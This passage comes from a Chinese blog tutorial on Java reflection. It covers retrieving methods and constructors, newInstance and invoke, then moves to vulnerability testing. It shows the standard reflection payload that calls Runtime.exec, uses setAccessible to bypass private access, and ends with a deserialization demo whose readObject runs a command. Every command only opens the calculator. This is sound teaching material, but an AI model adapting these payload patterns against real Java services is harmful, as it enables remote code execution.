class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MethodTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">study</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"学习中..."</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"跑步中..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"吃饭中..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"睡眠中..."</span> <span class="token operator">+</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"sleep"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.reflect.MethodTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 创建Class对象</span>            <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods1 <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取所有该类中的所有方法</span>            <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods2 <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Method</span> m<span class="token operator">:</span>methods1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------分割线---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Method</span> m<span class="token operator">:</span>methods2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------分割线---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Method</span> methods3 <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"study"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取study方法</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>methods3<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------分割线---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Method</span> method4 <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"sleep"</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取sleep方法</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>method4<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="7.png" loading="lazy"></p><h3 id="获取构造函数Constructor"><a href="#获取构造函数Constructor" class="headerlink" title="获取构造函数Constructor"></a>获取构造函数Constructor</h3><p>Constructor&lt;?&gt;[] getConstructors() ：只返回public构造函数</p><p>Constructor&lt;?&gt;[] getDeclaredConstructors() ：返回所有构造函数</p><p>Constructor&lt;&gt; getConstructor(类&lt;?&gt;… parameterTypes) : 匹配和参数配型相符的public构造函数</p><p>Constructor&lt;&gt; getDeclaredConstructor(类&lt;?&gt;… parameterTypes) ： 匹配和参数配型相符的构造函数</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConstructorTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">ConstructorTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"无参构造函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">ConstructorTest</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"有参构造函数"</span> <span class="token operator">+</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token class-name">ConstructorTest</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"私有构造函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Class</span> c1 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.reflect.ConstructorTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Constructor</span><span class="token punctuation">[</span><span class="token punctuation">]</span> constructors1  <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Constructor</span><span class="token punctuation">[</span><span class="token punctuation">]</span> constructors2 <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Constructor</span> c <span class="token operator">:</span> constructors1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------分割线---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Constructor</span> c <span class="token operator">:</span> constructors2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------分割线---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Constructor</span> constructors3 <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>constructors3<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------分割线---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Constructor</span> constructors4 <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">boolean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>constructors4<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="8.png" loading="lazy"></p><h3 id="反射创建类对象"><a href="#反射创建类对象" class="headerlink" title="反射创建类对象"></a>反射创建类对象</h3><p>在前面我们获取了Class对象，之后展示了一系列获取成员变量、成员方法和成员函数的方式后，我们现在可以通过反射来生成实例化对象，一般我们使用Class对象的newInstance()方法来进行创建类对象。</p><p>使用的方式也特别简单，只需要通过forname方法获取到的class对象中进行newInstance方法创建即可。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.reflect.MethodTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 创建Class对象</span>            <span class="token class-name">Object</span> m1 <span class="token operator">=</span>  c<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 创建类对象</span></code></pre><p>这里也顺便说下invoke方法，invoke方法位于java.lang.reflect.Method类中，用于执行某个的对象的目标方法。<br>一般会和getMethod方法配合进行调用。</p><p>使用用法</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> args<span class="token punctuation">)</span></code></pre><p>第一个参数为类的实例，第二个参数为相应函数中的参数</p><p>obj：从中调用底层方法的对象，必须是实例化对象</p><p>args： 用于方法的调用，是一个object的数组，参数有可能是多个</p><p>但需要注意的是，invoke方法第一个参数并不是固定的：</p><p><strong>如果调用这个方法是普通方法，第一个参数就是类对象；</strong></p><p><strong>如果调用这个方法是静态方法，第一个参数就是类；</strong></p><p>将我们的知识进行整合归纳下，我们可以写个完整的小例子。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">reflectMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"反射测试成功!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.reflect.ReflectTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 创建Class对象</span>            <span class="token class-name">Object</span> m <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 创建类实例对象</span>            <span class="token class-name">Method</span> method <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"reflectMethod"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取reflectMethod方法</span>            method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 调用类实例对象方法</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="9.png" loading="lazy"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>上面我们讲述了反射机制流程概念和基本使用方法，从Class对象获取，到获取成员变量、成员方法和构造函数，接着是newInstance创建类对象和invoke方法，最后是一个简单反射例子的组成。相信大家都对反射有个很清晰的了解和认识，现在我们来看看我们平时漏洞测试中，如何使用java反射中如何获取Runtime类来命令执行测试弹出计算器。</p><h3 id="利用反射构造Runtime类执行"><a href="#利用反射构造Runtime类执行" class="headerlink" title="利用反射构造Runtime类执行"></a>利用反射构造Runtime类执行</h3><p>这里我们可以先模仿前面的反射例子，尝试去反射执行Runtime类去命令执行。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RuntimeTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> c1 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> m <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="10.png" loading="lazy"></p><p>但我们发现了使用newInstance产生了报错的话，而往往其可能是以下原因未能实现。</p><p>1、使用的类没有无参构造函数</p><p>2、使用的类构造函数是私有的</p><p>之后我们查看其出错原因，java.lang.Runtime with modifiers “private”。Runtime类的构造方法是private权限私有的，是根据“单例模式”进行设计的，我们无法进行直接调用。看来我们上述的反射机制也是有限制的，并不能饶过private权限的检查。</p><p>既然我现在不能绕过private权限的检测，那我先不管newIntance创建类对象，先获取Rumtime类的方法先谈个计算器再看看。所以我们需要对代码进行简单修改下。</p><p>我们使用getMethod作用通过反射获取一个类的某个特定的公有方法。且java中支持类的重载，我们不能仅通过函数名确定一个函数。在调用getMethod时候，需要传给他你需要获取的函数的参数类型列表。</p><p>如Runtime.exec方法有6个重载：</p><p><img src="11.png" loading="lazy"></p><p>exec(String commmand)</p><p>我们可以实用最简单这种只有一个参数且类型是String。实用getMethod(“exec”,String.class)获取Runtime.exec方法，并且获取getRuntime方法来执行。</p><p><img src="12.png" loading="lazy"></p><p>然后我们将这段代码进行简略下，就生成以下我们常见的反射payload测试：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> c1 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c1<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>c1<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这里我们虽然成功执行方法弹出计算器，但仅仅只是调用其方法去实现。而我们还是想执行其私有方法，通过newInstance来构造使用。这样就需要我们通过setAccessible(true)来突破访问权限的检查。</p><h3 id="设置setAccessible-true-暴力访问权限"><a href="#设置setAccessible-true-暴力访问权限" class="headerlink" title="设置setAccessible(true)暴力访问权限"></a>设置setAccessible(true)暴力访问权限</h3><p>在一般情况下，我们使用反射机制不能对类的私有private字段进行操作，绕过私有权限的访问。但一些特殊场景存在例外的时候，比如我们进行序列化操作的时候，需要去访问这些受限的私有字段，这时我们可以通过调用AccessibleObject上的setAccessible()方法来允许访问。</p><p>Java.lang.reflect.AccessibleObject类是Field，Method和Constructor类对象的基类，可以提供将反射对象标记为使用它抑制摸人Java访问控制检查的功能，同时上述的反射类中的Field，Method和Constructor继承自AccessibleObject。所以我们在这些类方法基础上调用setAccessible()方法，既可对这些私有字段进行操作。</p><p>所有我们最开始的代码再修改简略下，就能成功命令执行了。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RuntimeTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> c1<span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> m <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        m<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        c1<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="13.png" loading="lazy"></p><h3 id="Java反序列化漏洞demo"><a href="#Java反序列化漏洞demo" class="headerlink" title="Java反序列化漏洞demo"></a>Java反序列化漏洞demo</h3><p>最后结束就用一个之前学习java反射的时候学习的demo，如果我们在进行反序列化过程中可控的话，能够加载我们使用反射调用的恶意命令语句的话，则能够成功进行命令执行。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> demo <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> age<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token function">demo</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token class-name">Integer</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 构造函数，初始化时执行</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ObjectInputStream</span> in<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span><span class="token class-name">ClassNotFoundException</span><span class="token punctuation">&#123;</span>        in<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 调用原始的readObject方法</span>        <span class="token keyword">try</span><span class="token punctuation">&#123;</span> <span class="token comment">// 通过反射方法执行命令;</span>            <span class="token class-name">Method</span> method <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> result <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             demo x <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             operation<span class="token punctuation">.</span><span class="token function">ser</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>             operation<span class="token punctuation">.</span><span class="token function">deser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> operation<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ser</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token comment">// 序列化操作，写数据</span>            <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"object.obj"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// ObjectOutStream能把Object输出成Byte流</span>            